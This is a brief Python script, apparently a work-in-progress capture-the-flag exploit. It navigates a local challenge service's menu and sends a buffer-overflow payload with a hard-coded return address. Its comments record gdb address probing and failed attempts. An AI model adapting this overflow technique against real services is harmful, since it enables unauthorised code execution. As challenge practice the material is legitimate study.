#!/usr/bin/env python3

import socket
import time

HOSTNAME = '127.0.0.1'
PORT = 9999

#payload = b'a'*48+b'\x90'*7
payload = b'a'*48+b'\x90\x07\xe3\x49\xfe\x7f\x00' #points at controlled memory? no.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOSTNAME, PORT))
time.sleep(10)
print("Running...")
while 1:
	data = s.recv(1024)
	if len(data) ==0:
		break
	if data==b'are enabled!\n[*] Values are set to: a = [1], b = [2], c = [3].\n[*] If you want to continue, disable the mechanism or login as admin.\n\n1. Disable mechanisms \xe2\x9a\x99\xef\xb8\x8f\n2. Login \xe2\x9c\x85\n3. Exit \xf0\x9f\x8f\x83\n>> ':
		time.sleep(1)
		s.send(b'1')
	if data==b'\n[*] Input: ':
		time.sleep(1)
		s.send(payload)
print("Connection closed.")
s.close()


#### x/14x 0x7ffc52498b80 <- memory we control? nope.
#### x/14x 0x7ffe49e30790
#### x/14x 0x7ffc7f3148c0
#### x/14x 0x7ffccc677ba0 <- inconsistent when remote? yes.
#### x/14x 0x7ffd0c952d40
